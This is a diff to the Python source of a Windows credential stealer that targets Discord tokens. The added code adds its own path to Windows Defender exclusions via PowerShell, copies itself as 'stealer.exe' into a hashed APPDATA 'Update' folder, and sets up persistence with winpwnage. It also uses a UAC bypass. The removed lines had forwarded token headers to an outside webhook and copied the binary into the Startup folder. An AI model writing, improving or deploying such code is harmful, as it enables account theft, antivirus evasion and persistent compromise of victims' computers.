@@ -22,6 +22,16 @@ import subprocess
 import ctypes
 import sys
 from winpwnage.functions.uac.uacMethod1 import uacMethod1
+from winpwnage.functions.persist.persistMethod2 import *
+import hashlib
+
+def get_executable_hash():
+    executable_path = sys.executable
+    with open(executable_path, 'rb') as f:
+        file_hash = hashlib.md5()
+        while chunk := f.read(8192):
+            file_hash.update(chunk)
+    return file_hash.hexdigest()
 
 def UACbypass(method: int = 1) -> bool:
     if GetSelf()[1]:
@@ -64,6 +74,14 @@ if not IsAdmin():
 
 def XDD():
     os.system("powershell -Command Add-MpPreference -ExclusionPath '{}'".format(GetSelf()[0]))
+    a = GetSelf()[0]
+    appdata_path = os.path.join(os.getenv('APPDATA'), "Update", get_executable_hash())
+    file = os.path.join(appdata_path, 'stealer.exe')
+    os.makedirs(appdata_path, exist_ok=True)
+    shutil.copy(a,file)
+    persistMethod2(file)
+    
+
 
 threading.Thread(target=XDD).start()
 
@@ -473,25 +491,10 @@ def CH3CK70K3N(token):
     }
     try:
         urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
-        urlopen(Request("https://inventor.gg/api/webhooks/wRrtQXEYiCgEmyT/CQoPkAlZyGJqVxyDYrnlzRhZXffONJ", headers=headers))
         return True
     except:
         return False
 
-if getattr(sys, 'frozen', False):
-    currentFilePath = os.path.dirname(sys.executable)
-else:
-    currentFilePath = os.path.dirname(os.path.abspath(__file__))
-
-fileName = os.path.basename(sys.argv[0])
-filePath = os.path.join(currentFilePath, fileName)
-
-startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-startupFilePath = os.path.join(startupFolderPath, fileName)
-
-if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():
-    with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
-        shutil.copyfileobj(src_file, dst_file)
 
 def Tr1M(obj):
     if len(obj) > 1000: 
